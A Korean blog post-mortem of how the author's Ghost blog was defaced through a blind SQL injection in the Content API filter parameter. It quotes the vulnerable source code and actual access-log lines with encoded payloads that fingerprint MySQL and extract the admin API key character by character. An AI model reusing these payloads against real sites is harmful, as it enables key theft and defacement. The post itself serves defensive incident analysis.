---
title: "내 블로그는 어떻게 Blind SQL Injection 공격에 당했나"
description: "얼마 전에 블로그의 게시물 하나가 변조된 사건이 있었다. Ghost의 어떤 취약점이 어떻게 악용되었는지 Nginx 로그와 취약점 원본 코드를 바탕으로 추적해 보았다."
pubDate: "2026-11-09T00:00:00+01:00"
tags: ["security", "hacking"]
---

2026년 10월 15일 오후였다. 블로그 이전을 위해 게시글을 백업하려고 오랜만에 사이트를 열었다. 가장 최근에 올린 글을 클릭했는데, 보여야 할 게시물 대신 알 수 없는 중국어 텍스트가 출력되었다. 누군가가 침입하여 접속자를 임의로 리디렉션 하는 스크립트를 삽입한 게 분명했다. 해당 스크립트는 `apple99[.]cc/nmvah/maosu/6.js`를 불러오고 있었다.

![무언가 단단히 잘못되었음을 보여주는 화면](/content/images/2026/11/attacker-text.png)

방문자의 피해를 막는 게 최우선이므로 우선 해당 게시물부터 바로 이전 버전으로 복원하고, 피해 범위를 확인했다. 다행히 문제가 된 건 가장 최근에 올린 게시물 하나의 본문뿐이었다. 헤더나 푸터 등 여러 페이지가 공유하는 영역에는 문제가 발견되지 않았다. 따라서 SQL Injection을 이용한 게시글 변조를 가장 유력한 공격 경로로 판단하고, 어느 취약점을 거쳐 어떻게 이런 짓을 벌인 것인지 찾아내기로 했다. 공격 지점을 파악해야 패치가 가능하니까.

운영 중이던 인스턴스 내부의 각 컨테이너 로그들을 날짜 역순으로 탐색했다. 탐색 도중 외부에서 들어오는 요청을 Ghost 컨테이너로 전달하는 `nginx-proxy`의 로그에서 실마리를 찾았다. **10월 14일 오후 무렵, 홍콩 쪽 IP 한 곳에서 들어온 의심스러운 요청이 1,232건 발견되었다.** 시간순으로 놓고 보니, 공개 게시물 조회 API에 비슷한 요청이 수백 번 들어온 뒤 관리자 API에서 문제가 된 게시물을 수정하는 흐름을 찾을 수 있었다.

| 시각 (UTC) | 로그에 남은 요청 |
| --- | --- |
| 15:19 | Ghost의 Content API를 통해 최초 탐색 |
| 15:25 ~ 15:27 | Admin API 키를 겨냥한 공격 후 게시물 조회 및 수정 |
| 15:32 ~ 15:35 | 필터 테스트와 키 추출을 다시 거친 뒤 같은 게시물을 수정 |

이 로그들을 토대로, 공격자가 어떤 경로로 어떤 기법을 활용했는지 파악했다. 내용은 아래와 같다.

## 공격 경로 되짚어 보기

### Ghost 구버전의 게시물 조회 API 취약점

Ghost의 공개 게시물 조회 API인 `GET /ghost/api/content/posts/`에는 `filter`라는 파라미터가 있다. 예를 들어 `filter=slug:[first-post,second-post]`를 보내면 두 슬러그에 해당하는 글을 고를 수 있는 것이다. 내가 마지막으로 사용했던 Ghost 버전 `5.101.6`에서는 별도의 `order`를 지정하지 않았을 때 이 목록을 정렬 순서로도 사용했다. `first-post`에는 `0`, `second-post`에는 `1`을 매겨 목록에 적힌 순서대로 돌려주는 방식이다.

문제는 정렬에 사용할 SQL을 만드는 과정에 있었다. 아래는 [Ghost 5.101.6 배포본](https://registry.npmjs.org/ghost/-/ghost-5.101.6.tgz)의 `slug-filter-order.js`에서 발췌한 코드다.

```js
const slugFilterOrder = (table, filter) => {
    let orderMatch = filter.match(/slug:\s?\[(.*)\]/);

    if (orderMatch) {
        let orderSlugs = orderMatch[1].split(',');
        let order = 'CASE ';

        orderSlugs.forEach((slug, index) => {
            order += `WHEN \`${table}\`.\`slug\` = '${slug}' THEN ${index} `;
        });

        order += 'END ASC';

        return order;
    }
};
```

`filter.match()`를 보면 `slug:[...]`의 대괄호 안 내용물을 꺼내고, `split(',')`은 그 내용을 쉼표로 나눈다. 위의 함수는 그렇게 나뉜 각 값을 `${slug}` 자리에 **전처리 없이** 그대로 끼워 넣고 있다. 여기가 바로 취약점의 근원이다.

앞선 예시와 같은 평범한 입력이라면 SQL에 `= 'first-post'`가 들어갈 것이다. 그런데 만약 입력에 작은따옴표(`'`)가 포함된다면, 코드상으로는 이 따옴표가 SQL 문자열을 닫는 기호로 해석될 수 있다. 공격자는 그 뒤에 넣은 표현식을 DBMS가 실행하도록 쿼리의 구조를 바꿀 수 있는 것이다.

### Boolean-based Blind SQL Injection으로 DB 종류 알아내기

공격자 `16.5.50.xx`는 이 취약점을 이용하여 DB 종류를 알아내기 위한 첫 번째 탐색을 시도했다. [Ghost에서 기본으로 제공하는 Zapier integration 기능](https://ghost.org/integrations/zapier/)에는 게시물 생성 및 소셜계정 공유 등을 자동화하기 위한 API Key가 연결되어 있는데, 이 Key 값이 아래 작업들을 수행하는 데에 악용되었다.

```sh
16.5.50.xx - - [14/Oct/2026:15:19:06 +0000] "GET /ghost/api/content/posts/?key={zapier-api-key}&filter=slug%3A%5B%27%7C%7CCASE+WHEN+1%3D1+THEN+hex%28randomblob%281000000000%29%29+ELSE+0+END%7C%7C%27%2Creflection-2025%5D HTTP/1.1" 500 292 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/131.0 Safari/537.36" "{instance-id}:2368"
16.5.50.xx - - [14/Oct/2026:15:19:06 +0000] "GET /ghost/api/content/posts/?key={zapier-api-key}&filter=slug%3A%5B%27%7C%7CCASE+WHEN+1%3D0+THEN+hex%28randomblob%281000000000%29%29+ELSE+0+END%7C%7C%27%2Creflection-2025%5D HTTP/1.1" 500 292 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/131.0 Safari/537.36" "{instance-id}:2368"
16.5.50.xx - - [14/Oct/2026:15:19:06 +0000] "GET /ghost/api/content/posts/?key={zapier-api-key}&filter=slug%3A%5B%27%7C%7CCASE+WHEN+1%3D1+THEN+0+ELSE+EXP%28710%29+END%7C%7C%27%2Creflection-2025%5D HTTP/1.1" 200 6773 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/131.0 Safari/537.36" "{instance-id}:2368"
16.5.50.xx - - [14/Oct/2026:15:19:07 +0000] "GET /ghost/api/content/posts/?key={zapier-api-key}&filter=slug%3A%5B%27%7C%7CCASE+WHEN+1%3D0+THEN+0+ELSE+EXP%28710%29+END%7C%7C%27%2Creflection-2025%5D HTTP/1.1" 500 292 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/131.0 Safari/537.36" "{instance-id}:2368"
```

여기서 주목할 부분은 SQL 쿼리문에 포함된 `hex(randomblob(1000000000))`과 `EXP(710)`이다. Ghost는 SQLite와 MySQL를 데이터베이스로 지원한다. 공격자는 공격 대상이 둘 중 어느 것을 쓰고 있는지 파악하기 위해 이와 같은 장치를 마련했다.
- `hex(randomblob(N))`은 SQLite 전용 함수의 조합으로, N-byte BLOB 데이터를 받아 16진수로 변환한다. SQLite에서는 16진수로 변환한 결과가 문자열 길이 한도를 넘기게 되므로 `SQLITE_TOOBIG` 오류가 발생한다.
- `EXP(N)`은 MySQL 함수로 자연상수 *e*, 약 `2.71828`을 `N`제곱하여 반환한다. 반환 결과가 MySQL에서 부동소수점으로 표현 가능한 범위를 넘기므로 오버플로를 일으킨다.

이때 공격자는 위의 두 시나리오에 각각 `1=1`과 `1=0`의 두 가지 조건을 넣었다. 조건만 다를 뿐 표현식 자체는 동일하다. 즉, 두 종류의 다른 표현식을 시험하여 이 서버에서 참 혹은 거짓 응답을 구분할 수 있었던 쪽을 가려내기 위한 작업이다.

위의 로그들을 다시 살펴보면, `EXP(710)` 표현식이 포함된 3~4번째 줄에서만 응답이 `200`과 `500`으로 갈렸다. 공격자는 이로써 공격 대상이 MySQL을 사용 중임을 파악하게 되었다. 응답 본문에 조회한 값이 직접 나타나지 않아도, 응답 차이를 통해 데이터베이스에 던진 질문의 답을 유추할 수 있는 것이다. 이것이 바로 **[불리언 기반 블라인드 SQL 인젝션(Boolean-based blind SQL injection)](https://community.owasp.org/attacks/Blind_SQL_Injection)** 기법이다.

### 연속된 SQL 쿼리로 Admin API Key 추출하기

데이터베이스 탐색이 끝나자, 공격자는 `api_keys` 테이블에서 타입이 `admin`인 항목을 ID 순으로 정렬해 첫 번째 행을 골랐다. 먼저 `id`와 `secret`의 길이를 알아낸 다음, 각 위치의 문자를 아스키 코드로 바꿔 기준값과 비교하는 작업을 거쳤다. 실제 로그에서 `id`의 첫 글자에 대한 비교 두 건을 예시로 뽑아보면 다음과 같다.

```sh
16.5.50.xx - - [14/Oct/2026:15:25:45 +0000] "GET /ghost/api/content/posts/?key={zapier-api-key}&filter=slug%3A%5B%27%7C%7CCASE+WHEN+%28ASCII%28SUBSTR%28%28SELECT+id+FROM+api_keys+WHERE+type%3D0x61646d696e+ORDER+BY+id+ASC+LIMIT+1%29+FROM+1+FOR+1%29%29+%3C%3D+54%29+THEN+0+ELSE+EXP%28710%29+END%7C%7C%27%2Creflection-2025%5D HTTP/1.1" 200 6779 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/131.0 Safari/537.36" "{instance-id}:2368"
16.5.50.xx - - [14/Oct/2026:15:25:45 +0000] "GET /ghost/api/content/posts/?key={zapier-api-key}&filter=slug%3A%5B%27%7C%7CCASE+WHEN+%28ASCII%28SUBSTR%28%28SELECT+id+FROM+api_keys+WHERE+type%3D0x61646d696e+ORDER+BY+id+ASC+LIMIT+1%29+FROM+1+FOR+1%29%29+%3C%3D+53%29+THEN+0+ELSE+EXP%28710%29+END%7C%7C%27%2Creflection-2025%5D HTTP/1.1" 500 292 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/131.0 Safari/537.36" "{instance-id}:2368"
```

이 로그가 의미하는 바를 도표로 요약하면 다음과 같다.

| 비교 조건 | HTTP 응답 | 확인된 결과 |
| --- | --- | --- |
| 첫 글자의 아스키 코드가 `54` 이하인가? | `200` | `54` 이하 |
| 첫 글자의 아스키 코드가 `53` 이하인가? | `500` | `53` 초과 |

두 결과를 합치면 첫 글자의 아스키 코드는 `54`, 즉 `6`이다. 앞서 소개한 Boolean-based blind SQL injection 기법으로, MySQL에서 오버플로 오류를 일으키는 `EXP(710)` 표현식을 조건문으로 활용하여 그에 대한 HTTP 응답 코드로 개별값들을 유추해낸 것이다. 이런 방식으로 24자리 `id`와 64자리 `secret`를 비롯한 Admin API 키 탈취에 성공한 공격자는 PUT 요청으로 아래 로그와 같이 게시물을 마음대로 수정할 수 있었다.

```sh
16.5.50.xx - - [14/Oct/2026:15:27:38 +0000] "PUT /ghost/api/admin/posts/{post-id}/ HTTP/1.1" 200 7884 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/131.0 Safari/537.36" "{instance-id}:2368"
16.5.50.xx - - [14/Oct/2026:15:32:56 +0000] "GET / HTTP/1.1" 200 10655 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/131.0 Safari/537.36" "{instance-id}:2368"
```

## 조사 과정에서 배운 점

### 운영 환경의 취약점 패치를 수시로 챙겨야 한다

Ghost는 이미 2026년 2월 16일 Content API의 [SQL Injection 취약점 `CVE-2026-26980`과 패치를 함께 공개한 바 있었다](https://github.com/TryGhost/Ghost/security/advisories/GHSA-w52v-v783-gw97). 회사 제품의 보안 권고 리포트는 꼬박꼬박 챙겨보는 내가 정작 내 블로그의 취약점은 제대로 돌아보질 않았다. 이래서는 안 되었다.

운영 환경에서 돌아가고 있는 애플리케이션에 대한 유지보수 책임은 운영자에게 있다. 보안도 운영의 일부다. 특히나 멀티 컨테이너 기반 서비스를 운영 중이라면, 컨테이너가 돌아가는 인스턴스의 OS 및 런타임 환경, 그리고 컨테이너별 상시적인 보안 체크가 필수다.

### 내가 만든 적 없는 키, 환경변수 또한 유효한 관리 대상이다

이번 조사에서 확인한 Admin API 키는 내가 기존에 생성했던 것이 아닌, **Ghost 자체에 기본으로 포함되어 있던 Zapier 연동용 키**였다. 만든 적도, 쓴 적도 없기에 신경 쓰지 못했던 항목이다.

일반적으로 비밀값을 관리할 때엔 직접 발급한 키나 직접 입력한 비밀번호만 떠올리기 쉽다. 그러나 실제로는 애플리케이션이 자동 생성하여 데이터베이스에 보관하는 키도 있고, 환경변수나 `.env` 파일에 넣어 둔 정보들도 있을 수 있다. 애플리케이션 운영자라면 외부 노출 없이 보호되어야 할 값들이 각각 어디에 저장되어 있는지, 그리고 어떤 프로세스가 읽어 들이는지까지 파악해 두어야 한다. 아울러 환경변수로 전달하는 값도 배포 설정이나 로그를 공유할 때 함께 노출될 수 있음을 유념해야 한다.

### 공격자는 공격 대상의 규모나 성격을 가리지 않는다

이번 조사 과정에서, 나와 동일한 공격을 겪은 사례가 상당히 많다는 것을 알게 되었다. 모두 같은 경로의 리디렉션 스크립트를 삽입 당한 경우였다.

- [My blog got hacked - and how to scan your own sites for injected scripts](https://www.kernelreloaded.com/my-blog-got-hacked-and-how-to-scan-your-own-sites-for-injected-scripts/)
- [Ghost 投毒攻击事件调查](https://www.ruanx.net/ghost-redirect-attack-review/)

하루에 한 명도 오지 않을 법한 이런 웹사이트마저 공격 대상이 될 줄은 몰랐다. 하지만 공격자가 실제 의도했던 동작이 중국 온라인 데이팅 스캠 앱 다운로드 링크로의 리디렉션이었다는 것을 파악한 후에는 생각이 달라졌다. 아마도 남의 웹사이트를 탈취하여 인터넷 사업자들의 스팸 필터링에 걸리지 않을 리디렉션 경로를 확보하려던 작업으로 추정된다. 만약 그렇다면, 피해 대상자의 웹사이트에 실제로 트래픽이 얼마나 존재하는지는 이들에겐 딱히 중요한 고려 사항이 아니다. URL 세탁을 위한 중간 경로만 얻어내면 그만인 것이다.

누구나 줄글로 코드를 만드는 시절이 되었다. 누구든 마음만 먹으면 남의 코드를 헤집을 수 있는 시절이란 뜻도 된다. 최근 늘어난 오픈소스 및 상용 프로그램 관련 사건 사고들은 이런 시대적 변화와 절대 무관하지 않을 것이다. 앞으로 인터넷에 공개 노출된 모든 엔드포인트들은 나와 고객 모두를 향한 잠재적 취약점이라는 생각을 지녀야 한다.
